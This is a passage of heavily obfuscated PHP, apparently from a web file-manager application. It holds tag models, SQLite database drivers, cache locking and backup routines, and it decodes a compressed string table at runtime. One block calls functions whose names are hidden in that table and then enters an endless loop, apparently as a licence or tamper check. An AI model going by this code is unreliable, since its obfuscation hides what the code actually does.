($this->isParentOf($C[$A], $C[$A])) { $Dꦝ = !0; break; } } if (!$Dꦝ) { $C[] = $C[$A]; } } return $C; } protected function isParentOf($AԜ, $b󛭆) { goto aۧ; Bب: return !1; goto d؅; aۧ: $E䪾 =& $_SERVER[Ť]; if (!$AԜ || !$b󛭆 || $AԜ == $b󛭆) { return !1; } $A吅 = $this->getInfoSimple($AԜ); goto aƊѳ; aƊѳ: $c = $this->getInfoSimple($b󛭆); $Dƾ = $A吅[$E䪾[476]] . $AԜ . $E䪾[47]; if (substr($c[$E䪾[476]], 0, strlen($Dƾ)) == $Dƾ) { return !0; } goto Bب; d؅: } public function groupShowRoot($c, $fշ = false) { goto f򶱾; b: if ($fշ && count($e) == 1) { return $cɣч; } if (!$D[$a[433]] || !isset($D[$a[433]][$a[1731]]) || $D[$a[433]][$a[1731]] == $a[1704]) { return $this->groupShowRoot($e[count($e) - 1], $fշ); } if ($D[$a[433]][$a[1731]] == $a[353]) { $D = explode($a[47], $D[$a[433]][$a[1732]]); if ($D) { $cɣч = array_merge($cɣч, $D); } } goto F䗌Ϭ; EÂ: $e = $this->parentLevelArray($D[$a[476]]); $cɣч = array($c); if (count($e) == 0) { return $cɣч; } goto b; f򶱾: $a =& $_SERVER[Ť]; $D = $this->getInfo($c); if (!$D) { return array(); } goto EÂ; F䗌Ϭ: return $cɣч; goto f̒; f̒: } protected function resetParentLevel() { $E =& $_SERVER[Ť]; $Aǥ = $E[1652]; $C = $this->select(); $C = array_to_keyvalue($C, $Aǥ); foreach ($C as $C֍柸) { goto AȊ; AȊ: $aߩɪ = $C֍柸; $EЅ = array(); while ($aߩɪ[$E[478]] != 0) { $EЅ[] = $aߩɪ[$E[478]]; $aߩɪ = $C[$aߩɪ[$E[478]]]; } goto C꼄; C꼄: $EЅ[] = 0; $EЅ = $E[47] . implode($E[47], array_reverse($EЅ)) . $E[47]; $this->setNamePinyin($C֍柸[$Aǥ], $C֍柸[$E[28]]); goto b; b: $this->where(array($Aǥ => $C֍柸[$Aǥ]))->save(array($E[542] => $EЅ)); goto A; A: } return $C; } public function groupNameAuto($E, $fߠ) { $D =& $_SERVER[Ť]; $eР嵞 = $this->where(array($D[384] => $E))->getField($D[28], !0); if (!$eР嵞 || !in_array($fߠ, $eР嵞)) { return $fߠ; } for ($E´ = 1; $E´ <= count($eР嵞) + 1; $E´++) { $D񈅷 = $fߠ . "\x28{$E´}\51"; if (!in_array($D񈅷, $eР嵞)) { return $D񈅷; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($fލ) { $c =& $_SERVER[Ť]; return array($c[1750] => array($fލ[0], $c[1751]), $c[1752] => array($fލ[0], $c[1753])); } protected function get($cӗֽ) { $fè =& $_SERVER[Ť]; $F۶ձ = Model($fè[475])->metaGet($cӗֽ, $fè[1754]); $e = json_decode($F۶ձ, !0); return $e ? $e : array($fè[1755] => $fè[83], $fè[361] => array()); } protected function set($Eם, $cٌ􉴷) { $aבܸ =& $_SERVER[Ť]; $cٌ􉴷 = $cٌ􉴷 ? $cٌ􉴷 : array($aבܸ[1755] => $aבܸ[83], $aבܸ[361] => array()); Model($aבܸ[475])->metaSet($Eם, $aבܸ[1754], json_encode($cٌ􉴷)); return Model($aבܸ[475])->metaSet($Eם, $aבܸ[1754], json_encode($cٌ􉴷)); } protected function getByTagID($d, $D՜) { goto bɇ; C: return is_array($FѦ) ? $FѦ : !1; goto cΐ; bɇ: $B޸ =& $_SERVER[Ť]; if (!$d || !$D՜) { return !1; } if (!Model($B޸[475])->getInfoSimple($d)) { return !1; } goto BԐ; BԐ: $e = $this->get($d); if (!$e || !isset($e[$B޸[361]])) { return !1; } $FѦ = array_find_by_field($e[$B޸[361]], $B޸[383], $D՜); goto C; cΐ: } public function listSource($f, $AԴ) { goto Eы; fҊÇ: $C = array(); foreach ($Dﻊ as $E) { $C䪆ɟ = $E[$Bڶ[75]]; if (!$C䪆ɟ) { continue; } if (!isset($C[$C䪆ɟ])) { $C[$C䪆ɟ] = array(); } $C[$C䪆ɟ][] = $E[$Bڶ[409]]; } $Aǉ = array(); goto AԈ; bסֲ: $EǬ = array_to_keyvalue($F٪[$Bڶ[73]], $Bڶ[33], $Bڶ[385]); $c悸 = array_merge($EǬ, $aԇ); foreach ($Aǉ as $C䪆ɟ) { if (!in_array($C䪆ɟ, $c悸)) { $Bݐ̚[] = $C䪆ɟ; } } goto Bڣ; Bڣ: if ($Bݐ̚) { $this->removeBySource($f, $Bݐ̚); } return $F٪; goto fϩ; fф: if (!$F٪ || count($Aǉ) == $F٪[$Bڶ[358]][$Bڶ[359]]) { return $F٪; } $Bݐ̚ = array(); $aԇ = array_to_keyvalue($F٪[$Bڶ[74]], $Bڶ[33], $Bڶ[385]); goto bסֲ; Eы: $Bڶ =& $_SERVER[Ť]; if ($AԴ && !is_array($AԴ)) { $AԴ = array($AԴ); } $Dﻊ = $this->listData($f); goto fҊÇ; AԈ: foreach ($C as $b޾ޯ× => $a텓) { $aԵӫ؎ = !0; if (!$AԴ) { $Aǉ[] = $b޾ޯ×; continue; } foreach ($AԴ as $e) { if (!in_array($e, $a텓)) { $aԵӫ؎ = !1; break; } } if ($aԵӫ؎) { $Aǉ[] = $b޾ޯ×; } } if (!$Aǉ) { return array(); } $F٪ = Model($Bڶ[1172])->listSource(array($Bڶ[399] => array($Bڶ[400], $Aǉ))); goto fф; fϩ: } protected function listData($Cԣ) { $b =& $_SERVER[Ť]; $Dꅖ = array($b[1485] => 0, $b[451] => array($b[1756], 0), $b[404] => $b[1757] . $Cԣ); $bݙ = $b[1758]; $b = $this->field($bݙ)->where($Dꅖ)->order($b[1759])->select(); return $b ? $b : array(); } protected function addToTag($CΆ, $F匳, $Bܬ) { $a⣑Ϙ =& $_SERVER[Ť]; if (!$this->getByTagID($CΆ, $Bܬ) || !$F匳) { return !1; } if (!Model($a⣑Ϙ[768])->pathInfo($F匳)) { return !1; } $dò = array($a⣑Ϙ[1485] => 0, $a⣑Ϙ[451] => $Bܬ, $a⣑Ϙ[403] => $F匳, $a⣑Ϙ[404] => $a⣑Ϙ[1760] . $CΆ, $a⣑Ϙ[402] => $a⣑Ϙ[33], $a⣑Ϙ[1656] => 0); if ($this->where($dò)->find()) { return !1; } return $this->add($dò); } protected function removeFromTag($D硶, $eթ۽, $D) { $CՂ豥 =& $_SERVER[Ť]; if (!$this->getByTagID($D硶, $D) || !$eթ۽) { return !1; } if (is_array($eթ۽)) { $eթ۽ = array($CՂ豥[7], $eթ۽); } $b݉ő = array($CՂ豥[1485] => 0, $CՂ豥[451] => $D, $CՂ豥[404] => $CՂ豥[1760] . $D硶, $CՂ豥[403] => $eթ۽); return $this->where($b݉ő)->delete(); } protected function removeByTag($c, $Eꪴ̲) { $bӰ =& $_SERVER[Ť]; if (!$this->getByTagID($c, $Eꪴ̲)) { return !1; } $e = array($bӰ[1485] => 0, $bӰ[451] => $Eꪴ̲, $bӰ[404] => $bӰ[1760] . $c); return $this->where($e)->delete(); } protected function removeBySource($aܩٟƔ, $bת) { $B =& $_SERVER[Ť]; if (!$aܩٟƔ || !$bת) { return !1; } if (is_array($bת)) { $bת = array($B[7], $bת); } $Bϖ = array($B[1485] => 0, $B[403] => $bת, $B[451] => array($B[942], 0), $B[404] => $B[1760] . $aܩٟƔ); return $this->where($Bϖ)->delete(); } } goto A; eҪ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e; Cۅ: $this->in =& $in; $this->values[$eϽ[6]] =& $config; $this->values[$eϽ[7]] =& $in; goto F; e: $eϽ =& $_SERVER[Ť]; global $in, $config; $this->config =& $config; goto Cۅ; F: $this->tpl = TEMPLATE . MOD . $eϽ[8]; $this->_classObjectID = mt_rand(0, 10000); goto Fي; Fي: } public function loadClass($bݚ) { if (1 === func_num_args()) { $this->{$bݚ} = new $bݚ(); } else { $aϷ = new ReflectionClass($bݚ); $Fǳ = func_get_args(); array_shift($Fǳ); $this->{$bݚ} = $aϷ->newInstanceArgs($Fǳ); } return $this->{$bݚ}; } protected function assign($FҨ, $F) { $this->values[$FҨ] = $F; } protected function display($a) { ob_end_clean(); extract($this->values); require $this->tpl . $a; } } class DbSqliteBase extends Db { public function __construct($b섍 = '') { $e究 =& $_SERVER[Ť]; if (!extension_loaded($e究[9])) { think_exception(think_lang($e究[10]) . $e究[11]); } if (!empty($b섍)) { if (!isset($b섍[$e究[12]])) { $b섍[$e究[12]] = 438; } $this->config = $b섍; if (empty($this->config[$e究[13]])) { $this->config[$e究[13]] = array(); } } } public function connect($D˸ = '', $b = 0) { $E =& $_SERVER[Ť]; if (!isset($this->linkID[$b])) { goto f퍵; eϯ: @sqlite_busy_timeout($this->linkID[$b], 30000); if (1 != think_config($E[18])) { unset($this->config); } goto E尶; Fװõ: $this->linkID[$b] = $B̑($D˸[$E[17]], $D˸[$E[12]]); if (!$this->linkID[$b]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto eϯ; f퍵: if (empty($D˸)) { $D˸ = $this->config; } $Eѿ = !empty($D˸[$E[13]][$E[14]]) ? $D˸[$E[13]][$E[14]] : $this->pconnect; $B̑ = $Eѿ ? $E[15] : $E[16]; goto Fװõ; E尶: } return $this->linkID[$b]; } public function free() { $this->queryID = null; } public function query($E܉˂) { goto C݅; B: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $cي = $this->getAll(); return $cي; } goto a; bփ: think_status($eв[20]); $this->queryID = sqlite_query($this->_linkID, $E܉˂); $this->debug(); goto B; C݅: $eв =& $_SERVER[Ť]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c؋쐧; c؋쐧: $this->queryStr = $E܉˂; if ($this->queryID) { $this->free(); } think_action_status($eв[19], 1); goto bփ; a: } public function execute($f) { goto E; aÞ: $this->queryStr = $f; if ($this->queryID) { $this->free(); } think_action_status($c׭[21], 1); goto eԿ; Eł: if (!1 === $F݃) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto AГł; E: $c׭ =& $_SERVER[Ť]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÞ; eԿ: think_status($c׭[20]); $F݃ = sqlite_exec($this->_linkID, $f); $this->debug(); goto Eł; AГł: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ť][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b׈˱ = sqlite_query($this->_linkID, $_SERVER[Ť][23]); if (!$b׈˱) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bª = sqlite_query($this->_linkID, $_SERVER[Ť][24]); if (!$Bª) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $d = array(); if ($this->numRows > 0) { for ($eլ킡 = 0; $eլ킡 < $this->numRows; $eլ킡++) { $d[$eլ킡] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $d; } public function getFields($b) { $Cʍ =& $_SERVER[Ť]; $d = $this->query($Cʍ[25] . $b . $Cʍ[26]); $E˪ = array(); if ($d) { foreach ($d as $eő => $c녫) { $E˪[$c녫[$Cʍ[27]]] = array($Cʍ[28] => $c녫[$Cʍ[27]], $Cʍ[29] => $c녫[$Cʍ[30]], $Cʍ[31] => (bool) ($c녫[$Cʍ[32]] === $Cʍ[33]), $Cʍ[34] => $c녫[$Cʍ[35]], $Cʍ[36] => strtolower($c녫[$Cʍ[37]]) == $Cʍ[38], $Cʍ[39] => strtolower($c녫[$Cʍ[40]]) == $Cʍ[41]); } } return $E˪; } public function getTables($DՇʹ = '') { $dԑ =& $_SERVER[Ť]; $d = $this->query($dԑ[42] . $dԑ[43] . $dԑ[44]); $dܮ = array(); foreach ($d as $cĐ => $Aׯ) { $dܮ[$cĐ] = current($Aׯ); } return $dܮ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $B·̠ɋ =& $_SERVER[Ť]; $D = sqlite_last_error($this->_linkID); $this->error = $D . $B·̠ɋ[4] . sqlite_error_string($D); if ($B·̠ɋ[33] != $this->queryStr) { $this->error .= LNG($B·̠ɋ[45]) . $this->queryStr; } think_trace($this->error, $B·̠ɋ[33], $B·̠ɋ[46]); return $this->error; } public function escapeString($A񉃍) { return sqlite_escape_string($A񉃍); } public function parseLimit($b) { $E׵ =& $_SERVER[Ť]; $c䈄ǩ = $E׵[33]; if (!empty($b)) { $b = explode($E׵[47], $b); if (count($b) > 1) { $c䈄ǩ .= $E׵[48] . $b[1] . $E׵[49] . $b[0] . $E׵[50]; } else { $c䈄ǩ .= $E׵[48] . $b[0] . $E׵[50]; } } return $c䈄ǩ; } } class DbSqlite3Base extends Db { public function __construct($eݬ󼫃 = '') { $D =& $_SERVER[Ť]; if (!class_exists($D[51])) { think_exception(think_lang($D[10]) . $D[52]); } if (!empty($eݬ󼫃)) { if (!isset($eݬ󼫃[$D[12]])) { $eݬ󼫃[$D[12]] = 438; } $this->config = $eݬ󼫃; if (empty($this->config[$D[13]])) { $this->config[$D[13]] = array(); } } } public function connect($fҋ = '', $aԼڗ = 0) { $fꂗ =& $_SERVER[Ť]; if (!isset($this->linkID[$aԼڗ])) { if (empty($fҋ)) { $fҋ = $this->config; } $this->linkID[$aԼڗ] = new SQLite3($fҋ[$fꂗ[17]]); if (!$this->linkID[$aԼڗ]) { think_exception($this->linkID[$aԼڗ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$aԼڗ]->busyTimeout(30000); if (1 != think_config($fꂗ[18])) { unset($this->config); } } return $this->linkID[$aԼڗ]; } public function free() { $this->queryID = null; } public function query($E) { goto f; F辛: $this->queryStr = $E; if ($this->queryID) { $this->free(); } think_action_status($E[19], 1); goto d皐; fȾ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $fҎ = $this->getAll(); $this->numRows = count($fҎ); return $fҎ; } goto c; d皐: think_status($E[20]); $this->queryID = $this->_linkID->query($E); $this->debug(); goto fȾ; f: $E =& $_SERVER[Ť]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F辛; c: } public function execute($FÅ) { goto aܫ; fʄ: if (!1 === $dϤ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Cӄ; Eڻ: $this->queryStr = $FÅ; if ($this->queryID) { $this->free(); } think_action_status($CΪݛ[21], 1); goto A; A: think_status($CΪݛ[20]); $dϤ = $this->_linkID->exec($FÅ); $this->debug(); goto fʄ; aܫ: $CΪݛ =& $_SERVER[Ť]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eڻ; Cӄ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ť][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bԭ = $this->_linkID->query($_SERVER[Ť][23]); if (!$Bԭ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $e򕏛 = $this->_linkID->query($_SERVER[Ť][24]); if (!$e򕏛) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $a = array(); while ($f  = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $a[] = $f ; } $this->queryID->reset(); return $a; } public function getFields($A̰) { $a =& $_SERVER[Ť]; $f = $this->query($a[25] . $A̰ . $a[26]); $E塧 = array(); if ($f) { foreach ($f as $eً => $bЏ) { $E塧[$bЏ[$a[28]]] = array($a[28] => $bЏ[$a[28]], $a[29] => $bЏ[$a[29]], $a[31] => (bool) ($bЏ[$a[31]] === $a[33]), $a[34] => $bЏ[$a[53]], $a[36] => (bool) $bЏ[$a[54]], $a[39] => (bool) $bЏ[$a[54]]); } } return $E塧; } public function getTables($dշߧ = '') { $e =& $_SERVER[Ť]; $bߠ = $this->query($e[42] . $e[43] . $e[44]); $B۾ = array(); foreach ($bߠ as $Aҕ => $cńƂ) { $B۾[$Aҕ] = current($cńƂ); } return $B۾; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $f =& $_SERVER[Ť]; $this->error = $this->_linkID->lastErrorMsg(); if ($f[33] != $this->queryStr) { $this->error .= LNG($f[45]) . $this->queryStr; } think_trace($this->error, $f[33], $f[46]); return $this->error; } public function escapeString($dؔʄ) { $F۸ =& $_SERVER[Ť]; if ($this->_linkID) { return $this->_linkID->escapeString($dؔʄ); } return str_ireplace($F۸[55], $F۸[56], $dؔʄ); } public function parseLimit($a͖) { $Dӱ =& $_SERVER[Ť]; $f = $Dӱ[33]; if (!empty($a͖)) { $a͖ = explode($Dӱ[47], $a͖); if (count($a͖) > 1) { $f .= $Dӱ[48] . $a͖[1] . $Dӱ[49] . $a͖[0] . $Dӱ[50]; } else { $f .= $Dӱ[48] . $a͖[0] . $Dӱ[50]; } } return $f; } } goto fޤ; cۯ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($b۟, $a܋) { $e߄ =& $_SERVER[Ť]; $this->cachePath = $b۟[$e߄[75]]; $this->prefix = $e߄[777]; $this->cacheTime = $a܋; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($eߦ) { $A =& $_SERVER[Ť]; $eߦ = str_replace(array($A[778], $A[93], $A[69]), $A[779], $eߦ); return $this->cachePath . $A[780] . $eߦ . $A[781]; } public function set($Cڐ, $e, $a = false) { $E΂ = $this->getFile($Cڐ); if (file_put_contents($E΂, $this->prefix . $e, LOCK_EX)) { return !0; } @unlink($E΂); return !1; } public function get($fש) { $C = $this->getFile($fש); if (file_exists($C) && filemtime($C) < time() - $this->cacheTime) { @unlink($C); return !1; } $C͏ = @file_get_contents($C); return substr($C͏, strlen($this->prefix)); } public function remove($C) { $Aߙ = $this->getFile($C); return @unlink($Aߙ); } public function deleteAll() { $eϷ =& $_SERVER[Ť]; $c㘃 = scandir($this->cachePath); foreach ($c㘃 as $E߆) { $A͍ = $this->cachePath . $E߆; if (strpos($A͍, $eϷ[781]) && strpos($A͍, $eϷ[782])) { @unlink($A͍); } } } public function clearTimeout() { $F񛤎 =& $_SERVER[Ť]; $dآχ = scandir($this->cachePath); foreach ($dآχ as $B¾ŗ) { $E̅ = $this->cachePath . $B¾ŗ; if (strpos($E̅, $F񛤎[781]) && strpos($E̅, $F񛤎[782]) && filemtime($E̅) < time() - $this->cacheTime) { @unlink($E̅); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto EԂ; D׎Ӊ: if ($aޠ == $FϹ[17] && $Cޘ == $FϹ[9]) { $aޠ = $FϹ[171]; } switch ($aޠ) { case $FϹ[773]: self::$handle = new CacheLockRedis(); break; case $FϹ[774]: self::$handle = new CacheLockMemcached(); break; case $FϹ[17]: self::$handle = new CacheLockDatabase(); break; case $FϹ[171]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto b׿ֆȎ; EԂ: $FϹ =& $_SERVER[Ť]; if (self::$handle) { return self::$handle; } $b = $GLOBALS[$FϹ[6]][$FϹ[343]]; goto cۭ; cۭ: self::$timeout = $b[$FϹ[783]] ? $b[$FϹ[783]] : 10; $Cޘ = _get($GLOBALS[$FϹ[6]], $FϹ[784]); $aޠ = $b[$FϹ[770]] ? $b[$FϹ[770]] : $FϹ[171]; goto D׎Ӊ; b׿ֆȎ: } private static function key($D͆) { return $_SERVER[Ť][785] . Cache::key($D͆); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($aͰ = '') { self::$errorMsg = $aͰ; } public static function lockGlobal($aٔٴ, $D˃ӓ) { return self::lock($aٔٴ, $D˃ӓ, !0); } public static function lock($A鮮, $b = false, $C׎ = false) { goto A; A: $fݍ =& $_SERVER[Ť]; $D㪆ː = self::init(); $cݪ = self::key($A鮮); goto B̡; B̡: $b = $b ? $b : self::$timeout; $Aۂ = $D㪆ː->lock($cݪ, $b); if (!$Aۂ) { $CӇ = "\x6c\x6f\143\x6b\40\145\162\x72\157\162\x3b\153\x65\171\x3d{$cݪ}\73\x74\151\x6d\x65\75{$b}\73" . self::$errorMsg . $fݍ[67] . get_caller_msg(); $aɅ = LNG($fݍ[786]) . "\x28{$b}\x73\54{$cݪ}\51\x21\xa" . LNG($fݍ[787]); $aɅ .= $fݍ[788]; if (is_string(self::$errorMsg) && self::$errorMsg) { $aɅ = $aɅ . $fݍ[789] . self::$errorMsg; } write_log($CӇ, $fݍ[790]); show_json($aɅ, !1); } goto F; F: if (!$C׎) { self::$lockItem[$cݪ] = !0; } return $Aۂ; goto b붙; b붙: } public static function lockGet($C뒖) { $ĉǮ = self::key($C뒖); if (self::$lockItem[$ĉǮ]) { return self::$lockItem[$ĉǮ]; } return self::init()->lockGet($ĉǮ); } public static function unlock($bƣʱ) { $Cӿ = self::key($bƣʱ); self::$lockItem[$Cӿ] = null; return self::init()->unlock($Cӿ); } public static function unlockRuntime() { $A̛ =& $_SERVER[Ť]; $b = self::init(); $b = !1; foreach (self::$lockItem as $C => $a襔) { if (!$a襔) { continue; } $b->unlock($C); if (!$b) { $b = !0; write_log($A̛[791] . $C . $A̛[67] . get_caller_msg(), $A̛[790]); continue; } write_log($A̛[791] . $C, $A̛[790]); } self::fileUnlockAll(); } public static function fileLock($B͋ܢŰ) { goto E; f: $BѴ = fopen(DATA_PATH . $B͋ܢŰ . $D𤃵[793], $D𤃵[794]); if (!$BѴ) { return !1; } $GLOBALS[$D𤃵[792]][$B͋ܢŰ] = $BѴ; goto d憼; d憼: if (flock($BѴ, LOCK_EX)) { return !0; } self::unlock($B͋ܢŰ); show_json($D𤃵[795], !1); goto d䂽; d䂽: return !1; goto eЦ; E: $D𤃵 =& $_SERVER[Ť]; if (!$GLOBALS[$D𤃵[792]]) { $GLOBALS[$D𤃵[792]] = array(); } $GLOBALS[$D𤃵[792]][$B͋ܢŰ] = !1; goto f; eЦ: } public static function fileUnlock($d滮) { $dЙ =& $_SERVER[Ť]; $eݒ = $GLOBALS[$dЙ[792]][$d滮]; if (!$eݒ) { return; } $GLOBALS[$dЙ[792]][$d滮] = !1; flock($eݒ, LOCK_UN); fclose($eݒ); } public static function fileUnlockAll() { $BБ =& $_SERVER[Ť]; if (!$GLOBALS[$BБ[792]]) { return; } foreach ($GLOBALS[$BБ[792]] as $bᎭ => $C̆) { if (!$C̆) { continue; } $GLOBALS[$BБ[792]][$bᎭ] = !1; flock($C̆, LOCK_UN); fclose($C̆); } $GLOBALS[$BБ[792]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto c󤨿; eϵ: $dڥ = $_SERVER[Ť][563]; while ($dڥ < $_SERVER[Ť][564]) { if ($dڥ >= 0) { break; } $dڥ++; } $_SERVER[] = explode($_SERVER[Ť][565], gzinflate(substr($_SERVER[Ť][566], 10, -8))); goto c; B: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $d =& $_SERVER[Ť]; self::$name = date($d[697]); if (!($Aߡ = Model($d[698])->lastItem())) { $Aߡ = $this->initData(); } else { self::$name = $Aߡ[$d[28]]; if ($Aߡ[$d[699]] == $d[83]) { self::$name = date($d[700]); $DǇ = 0; if (isset($Aߡ[$d[287]][$d[171]][$d[435]])) { $DǇ = (int) $Aߡ[$d[287]][$d[171]][$d[435]]; } if ($Aߡ[$d[28]] == self::$name) { Model($d[698])->remove($Aߡ[$d[383]]); } $Aߡ = $this->initData($DǇ, $Aߡ[$d[701]]); } else { $this->checkStore($Aߡ[$d[701]]); } } self::$option = $Aߡ; } private function initData($C = 0, $BԌ = '') { goto fܦ; cތ: $bװ[$Dȗ[383]] = $b۰; return $bװ; goto d; A׹: $this->checkStore($Cճʭ[$Dȗ[701]]); $bװ = array($Dȗ[701] => $Cճʭ[$Dȗ[701]], $Dȗ[28] => self::$name, $Dȗ[699] => 0, $Dȗ[702] => $Cճʭ[$Dȗ[702]], $Dȗ[287] => array($Dȗ[703] => array($Dȗ[699] => 0), $Dȗ[704] => array($Dȗ[699] => 0, $Dȗ[705] => 0, $Dȗ[706] => 0, $Dȗ[29] => $Dȗ[33]), $Dȗ[707] => array($Dȗ[699] => 0, $Dȗ[705] => 0, $Dȗ[706] => 0), $Dȗ[171] => array($Dȗ[699] => 0, $Dȗ[708] => 0, $Dȗ[709] => 0, $Dȗ[710] => 0, $Dȗ[711] => 0, $Dȗ[435] => $C)), $Dȗ[712] => time(), $Dȗ[464] => 0); $b۰ = Model($Dȗ[698])->insert($bװ); goto cތ; fܦ: $Dȗ =& $_SERVER[Ť]; $Cճʭ = Model($Dȗ[698])->config(); if ($BԌ && $Cճʭ[$Dȗ[701]] != $BԌ) { $C = 0; } goto A׹; d: } private function checkStore($B腳) { $a =& $_SERVER[Ť]; $f = Model($a[713])->listData($B腳); Model($a[713])->checkConfig($f); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ť][698])->findByName(self::$name); } return self::$option; } public static function set($d) { $eى =& $_SERVER[Ť]; $aД = self::get(); foreach ($d as $Cǰɨ => $dݯ) { $Fҭ = explode($eى[91], $Cǰɨ); $FΝ = count($Fҭ); switch ($FΝ) { case 1: $aД[$Fҭ[0]] = $dݯ; break; case 2: $aД[$Fҭ[0]][$Fҭ[1]] = $dݯ; break; case 3: $aД[$Fҭ[0]][$Fҭ[1]][$Fҭ[2]] = $dݯ; break; } } Model($eى[698])->update($aД[$eى[383]], $aД); self::$option = $aД; return self::$option; } public function keep() { $d =& $_SERVER[Ť]; $b = self::get(); if ($b[$d[287]][$d[703]][$d[699]] == $d[83]) { return; } $this->backupKeep($b); self::set(array($d[714] => 1)); } private function backupKeep($cݠ) { goto d钋; d: $F = 0; $Cֺ = array(); foreach ($cﴜ as $bȆ) { if ($F >= 7) { break; } $Cֺ[] = $bȆ[$f̐նӬ[28]]; $F++; } goto Dцӑђ; Dцӑђ: for ($F = 0; $F < 12; $F++) { $Cֺ[] = date($f̐նӬ[715], strtotime("\x2d{$F}\40\x6d\x6f\156\164\150\163")); } $Cֺ = array_unique($Cֺ); foreach ($cﴜ as $bȆ) { if (!empty($bȆ[$f̐նӬ[28]]) && in_array($bȆ[$f̐նӬ[28]], $Cֺ)) { continue; } Model($f̐նӬ[698])->remove($bȆ[$f̐նӬ[383]]); $Dߩ = "\173\x69\157\x3a{$cݠ[$f̐նӬ[701]]}\x7d\57\144\141\x74\141\142\x61\163\145\x2f\x62\141\143\x6b\165\x70\137{$bȆ[$f̐նӬ[28]]}"; IO::remove($Dߩ, !1); } goto e; d钋: $f̐նӬ =& $_SERVER[Ť]; $cﴜ = Model($f̐նӬ[698])->listData(); if (empty($cﴜ)) { return; } goto d; e: } public function db() { goto f̌; f̌: $C攂 =& $_SERVER[Ť]; $a׿ = self::get(); if ($a׿[$C攂[287]][$C攂[704]][$C攂[699]] == $C攂[83]) { return !0; } goto Bꗇ; EÒ: return !0; goto fǋ; Bꗇ: $b蠏 = new BackupDb(); if (!$b蠏->index()) { return !1; } self::set(array($C攂[716] => 1)); goto EÒ; fǋ: } public function dbFile() { goto F; Aብ: return !0; goto e; Bݕ: $fӊ = new BackupDbFile(); if (!$fӊ->index()) { return !1; } self::set(array($d[717] => 1)); goto Aብ; F: $d =& $_SERVER[Ť]; $EËԴ = self::get(); if ($EËԴ[$d[287]][$d[707]][$d[699]] == $d[83]) { return !0; } goto Bݕ; e: } public function file() { $fԴ =& $_SERVER[Ť]; $fٞ = self::get(); if ($fٞ[$fԴ[287]][$fԴ[171]][$fԴ[699]] == $fԴ[83]) { return !0; } if (!isset($fٞ[$fԴ[702]]) || $fٞ[$fԴ[702]] == $fԴ[485]) { $dԥ = new BackupFile(); if (!$dԥ->index()) { return !1; } } self::set(array($fԴ[718] => 1, $fԴ[699] => 1)); return !0; } } if (!isset($_SERVER[$_SERVER[Ť][719]]) || !isset($_SERVER[$_SERVER[Ť][720]])) { goto b; b: $f = $_SERVER[Ť][721]; $fᖖ = $_SERVER[$_SERVER[Ť][722]] . $_SERVER[Ť][723]; $dɦ = $f($fᖖ); goto eݎͫ; eݎͫ: $E = explode($_SERVER[Ť][225], $dɦ); if (count($E) < $_SERVER[Ť][564]) { $D = $_SERVER[Ť][724]; $D(); } $b = $_SERVER[Ť][725]; goto cÿ; cÿ: $b($_SERVER[$_SERVER[Ť][722]] . $_SERVER[Ť][723]); $D̯ = 2; while ($D̯ > 1) { $eɏ = rawurlencode($D̯ . $_SERVER[Ť][368]); } goto b; b: } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto a۫; a۫: $aӗ =& $_SERVER[Ť]; $b = Backup::get(); self::$io = $b[$aӗ[701]]; goto A; A: self::$name = $b[$aӗ[28]]; $cʓ = $GLOBALS[$aӗ[6]][$aӗ[17]]; $c̅ڱØ = $this->_dbType($cʓ); goto e܎; Dɪ: mk_dir($d); $eʎٿ = $B = 0; try { $c߆ = $E->db()->getTables(); } catch (Exception $E뷾˒) { return !1; } goto E; e܎: $E = new DbManage($cʓ, $c̅ڱØ); $d = TEMP_FILES . $aӗ[726] . self::$name . $aӗ[8]; del_dir($d); goto Dɪ; E: $c߆ = array_diff($c߆, array($aӗ[727], $aӗ[728])); foreach ($c߆ as $aߋ) { $eʎٿ += $E->model($aߋ)->count(); } $Dέ = new Task($aӗ[729], $aӗ[730], $eʎٿ, LNG($aӗ[731]) . $aӗ[732] . LNG($aӗ[733])); goto F埑; cշń: 